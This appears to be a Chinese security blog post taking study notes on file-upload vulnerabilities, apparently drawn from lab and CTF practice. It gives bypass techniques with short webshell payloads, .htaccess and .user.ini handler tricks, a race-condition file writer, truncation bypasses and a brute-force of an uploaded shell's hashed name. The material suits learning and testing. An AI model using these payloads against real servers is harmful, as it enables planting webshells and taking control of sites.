---
layout: post
title: File-Upload
subtitle: File-Upload
date: 2025-06-17 16:22
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags: 
published: true
---
## 1. 文件上传漏洞介绍

几乎每个网站中都会有文件上传的功能，譬如上传头像、视频、压缩包等。网站上传功能点未对客户端上传的文件进行严格的限制和过滤，导致恶意用户将一些恶意的文件或脚本上传到服务器并 url 访问执行，进而达到控制网站的目的，这就是文件上传漏洞。

### 1.1. 文件上传漏洞前提

1. 能成功上传木马或脚本
2. 知道上传后的路径
3. 上传的木马或脚本能被执行
4. 图片马需要配合文件包含漏洞或文件解析漏洞使用

## 2. 文件上传漏洞利用

### 2.1. 前端绕过

上传.php.jpg 文件，bp 抓包修改后缀

```http
filename="shell.php"
Content-Type: image/jpeg

GIF89a
<?php phpinfo();?>
```

![image.png](https://img.ghostliner.top/BVGH0r.png)

### 2.2. 其他文件格式

一般 php可执行文件格式：`php` `php2` `php3` `php4` `php5` `phtml`

原理：apache `httpd.config` 文件配置

```
AddType application/x-httpd-php .php .phtml .php3
```

### 2.3. 配置文件利用

**条件：可以上传配置文件**

可利用 apache 配置文件 `.htaccess`

```
<FilesMatch "webshell">
Sethandler application/x-httpd-php
</FilesMatch>
# or
AddHandler application/x-httpd-php .xxx
```

**条件：上传目录存在 php 文件，且必须运行在 fastcgi 模式**

php 配置文件 `.user.ini`

```ini
auto_prepend_file = 123.txt
auto_append_file = 123.txt
```

当访问上传目录中的 php 文件时，自动加载 `123.txt`

### 2.4. 二次渲染

上传图片经二次渲染时，可通过010比较前后两个图片未修改部分，将代码插入其中

### 2.5. 标签绕过

```php
<script language="php">eval();</script>
```

```php
<?=eval();?>
```

### 2.6. 条件竞争

上传 `shell.php` 内容：

```php
<?php fputs(fopen('php.php','w'),'<?php phpinfo();?>');?>
```

bp 循环上传、访问 `shell.php`

### 2.7. 截断绕过

%00 截断（要求 php 版本小于 5.3.4，php 的 magic_quotes_gpc 为 OFF 状态）

#### 2.7.1. get 截断

![image.png](https://img.ghostliner.top/yKCXlN.png)

#### 2.7.2. post 截断

将 `%00` 进行 url 转码，请求体内容不会自动转码

![image.png](https://img.ghostliner.top/Uxyrhj.png)

#### 2.7.3. 数组截断

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

分析代码：

`$file[count($file) - 1]`，正常情况是获取$file 数组最后一个下标数据，`count()` 函数在统计数组个数时只统计所有已定义元素，当 `save_name[1]` 未定义时，返回值为 2.

构造 payload

![image.png](https://img.ghostliner.top/8KeRaf.png)

### 2.8. 其他绕过方式

大写 `.PHP`、双写 `.pphphp` 、末尾加点，末尾加空格 `.php.` `.php. .` 、`.php::$data`

## 3. 例题

代码提示：

![image.png](https://img.ghostliner.top/VxNkxg.png)

```php
$files = @$_FILES["files"]
# 获取文件全名
$file_name = $files["name"]
# 获取文件后缀
$file_ext = substr($file_name,strrpos($file_name,".")+1)
# 生成新文件名
# md5(文件名随机数).后缀
md5($file_name.rand(1,99999)).".".
```

上传一句话木马 `shell.php`，使用 bp 爆破

设置 payload

![image.png](https://img.ghostliner.top/LTYLMa.png)

设置随机数 1-99999

![image.png](https://img.ghostliner.top/ie02HT.png)

设置前缀：shell.php，
设置进行 MD5 加密

![image.png](https://img.ghostliner.top/C1HCkb.png)

开始攻击，过滤状态码

![image.png](https://img.ghostliner.top/VALax3.png)

得到结果：`a4bb0a293d789ae48fecb913b1348e2f.php`

![image.png](https://img.ghostliner.top/Eiltrx.png)
